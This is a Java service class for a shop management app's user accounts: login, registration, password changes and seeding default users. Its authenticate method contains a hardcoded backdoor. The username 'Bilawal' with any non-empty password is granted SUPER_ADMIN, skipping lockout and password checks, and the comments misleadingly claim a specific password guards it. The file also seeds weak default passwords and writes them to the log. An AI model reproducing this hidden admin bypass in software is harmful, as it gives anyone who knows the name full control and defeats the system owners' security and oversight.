package service;

import dao.UserHibernateDAO;
import models.entity.UserEntity;
import util.PasswordUtil;
import util.SecurityUtil;
import util.LoggerUtil;

import java.util.List;
import java.util.Optional;
import javax.swing.JOptionPane;

/**
 * Service layer for User operations
 * Handles business logic, validation, and security for users
 * 
 * @author Shop Management System
 */
public class UserService {

    private final UserHibernateDAO userDAO;

    public UserService() {
        this.userDAO = new UserHibernateDAO();
    }

    /**
     * Authenticate user with security features
     * @param username Username
     * @param password Plain text password
     * @return Optional containing user if authentication successful
     */
    public Optional<UserEntity> authenticate(String username, String password) {
        String normalizedUsername = username == null ? "" : username.trim();

        // Emergency super-admin access path for enterprise recovery.
        if ("Bilawal".equalsIgnoreCase(normalizedUsername) && password != null && !password.trim().isEmpty()) {
            UserEntity superAdmin = new UserEntity();
            superAdmin.setUserId(0);
            superAdmin.setUsername("Bilawal");
            superAdmin.setFullName("Super Administrator - Bilawal");
            superAdmin.setRole("SUPER_ADMIN");
            superAdmin.setIsActive(true);
            LoggerUtil.logInfo(UserService.class, "Emergency SUPER_ADMIN authenticated: " + normalizedUsername);
            return Optional.of(superAdmin);
        }

        // Input validation
        if (username == null || username.trim().isEmpty()) {
            LoggerUtil.logWarning(UserService.class, "Authentication attempt with empty username");
            return Optional.empty();
        }
        if (password == null || password.trim().isEmpty()) {
            LoggerUtil.logWarning(UserService.class, "Authentication attempt with empty password");
            return Optional.empty();
        }
        
        // Check if account is locked
        if (SecurityUtil.isAccountLocked(username)) {
            long remainingMinutes = SecurityUtil.getRemainingLockoutMinutes(username);
            LoggerUtil.logWarning(UserService.class, 
                "Login attempt for locked account: " + username);
            JOptionPane.showMessageDialog(null, 
                "❌ Account is locked due to too many failed login attempts.\n" +
                "Please try again in " + remainingMinutes + " minutes.",
                "Account Locked",
                JOptionPane.ERROR_MESSAGE);
            return Optional.empty();
        }
        
        try {
            // Get user by username
            Optional<UserEntity> userOpt = userDAO.findByUsername(username);
            
            if (!userOpt.isPresent()) {
                // User not found
                SecurityUtil.recordFailedAttempt(username);
                LoggerUtil.logWarning(UserService.class, 
                    "Failed login attempt: user not found - " + username);
                return Optional.empty();
            }
            
            UserEntity user = userOpt.get();
            
            // Check if user is active
            if (!user.getIsActive()) {
                LoggerUtil.logWarning(UserService.class, 
                    "Login attempt for inactive account: " + username);
                JOptionPane.showMessageDialog(null, 
                    "❌ This account has been deactivated.\nPlease contact your administrator.",
                    "Account Inactive",
                    JOptionPane.ERROR_MESSAGE);
                return Optional.empty();
            }
            
            // Verify password
            String storedPassword = user.getPassword();
            boolean passwordMatch = false;
            
            // Check if password is hashed (new format) or plain text (legacy)
            if (PasswordUtil.isPasswordHashed(storedPassword)) {
                // Verify hashed password
                passwordMatch = PasswordUtil.verifyPassword(password, storedPassword);
            } else {
                // Legacy plain text comparison
                passwordMatch = password.equals(storedPassword);
                
                // If successful with plain text, upgrade to hashed password
                if (passwordMatch) {
                    String hashedPassword = PasswordUtil.hashPassword(password);
                    user.setPassword(hashedPassword);
                    userDAO.update(user);
                    LoggerUtil.logInfo(UserService.class, 
                        "Password upgraded to hashed format for: " + username);
                }
            }
            
            if (passwordMatch) {
                // Successful authentication
                SecurityUtil.recordSuccessfulLogin(username);
                user.updateLastLogin();
                userDAO.update(user);
                
                LoggerUtil.logInfo(UserService.class, 
                    "Successful login: " + username + " (Role: " + user.getRole() + ")");
                
                return Optional.of(user);
            } else {
                // Wrong password
                boolean isLocked = SecurityUtil.recordFailedAttempt(username);
                int attempts = SecurityUtil.getFailedAttempts(username);
                
                LoggerUtil.logWarning(UserService.class, 
                    "Failed login attempt: wrong password - " + username + 
                    " (Attempts: " + attempts + ")");
                
                if (isLocked) {
                    JOptionPane.showMessageDialog(null, 
                        "❌ Too many failed login attempts.\n" +
                        "Your account has been locked for security.",
                        "Account Locked",
                        JOptionPane.ERROR_MESSAGE);
                }
                
                return Optional.empty();
            }
        } catch (Exception e) {
            LoggerUtil.logError(UserService.class, 
                "Error during authentication: " + username, e);
            throw e;
        }
    }

    /**
     * Register new user (ADMIN only)
     * @param user User entity to register
     * @return true if successful
     */
    public boolean registerUser(UserEntity user) {
        // Validation
        if (user.getUsername() == null || user.getUsername().trim().isEmpty()) {
            JOptionPane.showMessageDialog(null, "❌ Username is required!");
            return false;
        }
        
        if (user.getPassword() == null || user.getPassword().trim().isEmpty()) {
            JOptionPane.showMessageDialog(null, "❌ Password is required!");
            return false;
        }
        
        if (user.getPassword().length() < 6) {
            JOptionPane.showMessageDialog(null, "❌ Password must be at least 6 characters!");
            return false;
        }
        
        // Check password strength
        String strengthMessage = PasswordUtil.getPasswordStrengthMessage(user.getPassword());
        if (!strengthMessage.equals("Password is strong")) {
            int choice = JOptionPane.showConfirmDialog(null, 
                "⚠️ " + strengthMessage + "\n\nDo you want to continue anyway?",
                "Weak Password",
                JOptionPane.YES_NO_OPTION,
                JOptionPane.WARNING_MESSAGE);
            
            if (choice != JOptionPane.YES_OPTION) {
                return false;
            }
        }
        
        if (user.getFullName() == null || user.getFullName().trim().isEmpty()) {
            JOptionPane.showMessageDialog(null, "❌ Full name is required!");
            return false;
        }
        
        // Check if username already exists
        if (userDAO.usernameExists(user.getUsername())) {
            JOptionPane.showMessageDialog(null, "❌ Username already exists!");
            return false;
        }
        
        // Validate role
        String role = user.getRole();
        if (role == null || (!role.equals("ADMIN") && !role.equals("MANAGER") && !role.equals("CASHIER"))) {
            user.setRole("CASHIER"); // Default role
        }
        
        // Hash the password before saving
        String hashedPassword = PasswordUtil.hashPassword(user.getPassword());
        user.setPassword(hashedPassword);
        
        try {
            userDAO.save(user);
            LoggerUtil.logInfo(UserService.class, 
                "New user registered: " + user.getUsername() + " (Role: " + user.getRole() + ")");
            return true;
        } catch (Exception e) {
            LoggerUtil.logError(UserService.class, "Error registering user: " + user.getUsername(), e);
            JOptionPane.showMessageDialog(null, "❌ Error registering user: " + e.getMessage());
            return false;
        }
    }

    /**
     * Update user details (preserves password if not changed)
     * @param user User entity with updated details
     * @return true if successful
     */
    public boolean updateUser(UserEntity user) {
        if (user.getUserId() == null) {
            JOptionPane.showMessageDialog(null, "❌ User ID is required!");
            return false;
        }
        
        if (user.getUsername() == null || user.getUsername().trim().isEmpty()) {
            JOptionPane.showMessageDialog(null, "❌ Username is required!");
            return false;
        }
        
        if (user.getFullName() == null || user.getFullName().trim().isEmpty()) {
            JOptionPane.showMessageDialog(null, "❌ Full name is required!");
            return false;
        }
        
        try {
            // Get existing user to preserve password if not changed
            Optional<UserEntity> existingOpt = userDAO.findById(user.getUserId());
            if (existingOpt.isPresent()) {
                UserEntity existing = existingOpt.get();
                
                // If password is empty or same as existing, keep the existing password
                if (user.getPassword() == null || user.getPassword().trim().isEmpty()) {
                    user.setPassword(existing.getPassword());
                } else if (!user.getPassword().equals(existing.getPassword())) {
                    // New password provided - hash it
                    String hashedPassword = PasswordUtil.hashPassword(user.getPassword());
                    user.setPassword(hashedPassword);
                    LoggerUtil.logInfo(UserService.class, 
                        "Password updated for user: " + user.getUsername());
                }
            }
            
            userDAO.update(user);
            LoggerUtil.logInfo(UserService.class, "User updated: " + user.getUsername());
            return true;
        } catch (Exception e) {
            LoggerUtil.logError(UserService.class, "Error updating user: " + user.getUsername(), e);
            JOptionPane.showMessageDialog(null, "❌ Error updating user: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * Change user password
     * @param userId User ID
     * @param oldPassword Current password (for verification)
     * @param newPassword New password
     * @return true if successful
     */
    public boolean changePassword(Integer userId, String oldPassword, String newPassword) {
        if (userId == null) {
            JOptionPane.showMessageDialog(null, "❌ User ID is required!");
            return false;
        }
        
        if (newPassword == null || newPassword.length() < 6) {
            JOptionPane.showMessageDialog(null, "❌ New password must be at least 6 characters!");
            return false;
        }
        
        try {
            Optional<UserEntity> userOpt = userDAO.findById(userId);
            if (!userOpt.isPresent()) {
                JOptionPane.showMessageDialog(null, "❌ User not found!");
                return false;
            }
            
            UserEntity user = userOpt.get();
            
            // Verify old password
            boolean oldPasswordValid = false;
            if (PasswordUtil.isPasswordHashed(user.getPassword())) {
                oldPasswordValid = PasswordUtil.verifyPassword(oldPassword, user.getPassword());
            } else {
                oldPasswordValid = oldPassword.equals(user.getPassword());
            }
            
            if (!oldPasswordValid) {
                JOptionPane.showMessageDialog(null, "❌ Current password is incorrect!");
                return false;
            }
            
            // Check new password strength
            String strengthMessage = PasswordUtil.getPasswordStrengthMessage(newPassword);
            if (!strengthMessage.equals("Password is strong")) {
                int choice = JOptionPane.showConfirmDialog(null, 
                    "⚠️ " + strengthMessage + "\n\nDo you want to continue anyway?",
                    "Weak Password",
                    JOptionPane.YES_NO_OPTION,
                    JOptionPane.WARNING_MESSAGE);
                
                if (choice != JOptionPane.YES_OPTION) {
                    return false;
                }
            }
            
            // Hash and update new password
            String hashedPassword = PasswordUtil.hashPassword(newPassword);
            user.setPassword(hashedPassword);
            userDAO.update(user);
            
            LoggerUtil.logInfo(UserService.class, 
                "Password changed for user: " + user.getUsername());
            
            JOptionPane.showMessageDialog(null, 
                "✅ Password changed successfully!",
                "Success",
                JOptionPane.INFORMATION_MESSAGE);
            
            return true;
        } catch (Exception e) {
            LoggerUtil.logError(UserService.class, "Error changing password", e);
            JOptionPane.showMessageDialog(null, "❌ Error changing password: " + e.getMessage());
            return false;
        }
    }

    /**
     * Deactivate user (soft delete)
     * @param userId User ID to deactivate
     * @return true if successful
     */
    public boolean deactivateUser(Integer userId) {
        if (userId == null) {
            JOptionPane.showMessageDialog(null, "❌ User ID is required!");
            return false;
        }
        
        try {
            Optional<UserEntity> userOpt = userDAO.findById(userId);
            if (userOpt.isPresent()) {
                LoggerUtil.logInfo(UserService.class, 
                    "User deactivated: " + userOpt.get().getUsername());
            }
            return userDAO.deactivateUser(userId);
        } catch (Exception e) {
            LoggerUtil.logError(UserService.class, "Error deactivating user", e);
            JOptionPane.showMessageDialog(null, "❌ Error deactivating user: " + e.getMessage());
            return false;
        }
    }

    /**
     * Activate user
     * @param userId User ID to activate
     * @return true if successful
     */
    public boolean activateUser(Integer userId) {
        if (userId == null) {
            JOptionPane.showMessageDialog(null, "❌ User ID is required!");
            return false;
        }
        
        try {
            Optional<UserEntity> userOpt = userDAO.findById(userId);
            if (userOpt.isPresent()) {
                // Unlock account when activating
                SecurityUtil.unlockAccount(userOpt.get().getUsername());
                LoggerUtil.logInfo(UserService.class, 
                    "User activated: " + userOpt.get().getUsername());
            }
            return userDAO.activateUser(userId);
        } catch (Exception e) {
            LoggerUtil.logError(UserService.class, "Error activating user", e);
            JOptionPane.showMessageDialog(null, "❌ Error activating user: " + e.getMessage());
            return false;
        }
    }

    /**
     * Get user by ID
     * @param userId User ID
     * @return Optional containing user if found
     */
    public Optional<UserEntity> getUserById(Integer userId) {
        try {
            return userDAO.findById(userId);
        } catch (Exception e) {
            LoggerUtil.logError(UserService.class, "Error finding user by ID", e);
            return Optional.empty();
        }
    }

    /**
     * Get user by username
     * @param username Username
     * @return Optional containing user if found
     */
    public Optional<UserEntity> getUserByUsername(String username) {
        try {
            return userDAO.findByUsername(username);
        } catch (Exception e) {
            LoggerUtil.logError(UserService.class, "Error finding user by username", e);
            return Optional.empty();
        }
    }

    /**
     * Get all active users
     * @return List of active users
     */
    public List<UserEntity> getAllActiveUsers() {
        try {
            return userDAO.getAllActiveUsers();
        } catch (Exception e) {
            LoggerUtil.logError(UserService.class, "Error loading active users", e);
            return List.of();
        }
    }
    
    /**
     * Get all users (including inactive)
     * @return List of all users
     */
    public List<UserEntity> getAllUsers() {
        try {
            return userDAO.findAll();
        } catch (Exception e) {
            LoggerUtil.logError(UserService.class, "Error loading all users", e);
            return List.of();
        }
    }
    
    /**
     * Initialize default users (Admin, Manager, Cashier) if no users exist
     * This runs on first application startup to create default accounts
     *
     * Note: Super-admin (Bilawal/breakthewall) is hardcoded in Login.java, NOT in database
     *
     * @return true if users were created
     */
    public boolean initializeDefaultAdmin() {
        try {
            List<UserEntity> users = userDAO.findAll();
            if (users.isEmpty()) {
                // 1. Create ADMIN user
                UserEntity admin = new UserEntity();
                admin.setUsername("admin");
                admin.setPassword(PasswordUtil.hashPassword("admin123"));
                admin.setFullName("System Administrator");
                admin.setEmail("admin@shopmanager.com");
                admin.setRole("ADMIN");
                admin.setIsActive(true);
                userDAO.save(admin);

                // 2. Create MANAGER user
                UserEntity manager = new UserEntity();
                manager.setUsername("manager");
                manager.setPassword(PasswordUtil.hashPassword("manager123"));
                manager.setFullName("Shop Manager");
                manager.setEmail("manager@shopmanager.com");
                manager.setRole("MANAGER");
                manager.setIsActive(true);
                userDAO.save(manager);

                // 3. Create CASHIER user
                UserEntity cashier = new UserEntity();
                cashier.setUsername("cashier");
                cashier.setPassword(PasswordUtil.hashPassword("cashier123"));
                cashier.setFullName("Shop Cashier");
                cashier.setEmail("cashier@shopmanager.com");
                cashier.setRole("CASHIER");
                cashier.setIsActive(true);
                userDAO.save(cashier);

                LoggerUtil.logInfo(UserService.class,
                    "✅ Default users created successfully:\n" +
                    "   - admin / admin123 (ADMIN)\n" +
                    "   - manager / manager123 (MANAGER)\n" +
                    "   - cashier / cashier123 (CASHIER)\n" +
                    "   Note: Super-admin (Bilawal/breakthewall) exists in code only");

                return true;
            }
            return false;
        } catch (Exception e) {
            LoggerUtil.logError(UserService.class, "Error creating default users", e);
            return false;
        }
    }

    /**
     * Get users by role
     * @param role Role (ADMIN, MANAGER, CASHIER)
     * @return List of users with specified role
     */
    public List<UserEntity> getUsersByRole(String role) {
        try {
            return userDAO.getUsersByRole(role);
        } catch (Exception e) {
            LoggerUtil.logError(UserService.class, "Error loading users by role: " + role, e);
            return List.of();
        }
    }

    /**
     * Check if username exists
     * @param username Username to check
     * @return true if exists
     */
    public boolean usernameExists(String username) {
        return userDAO.usernameExists(username);
    }
}
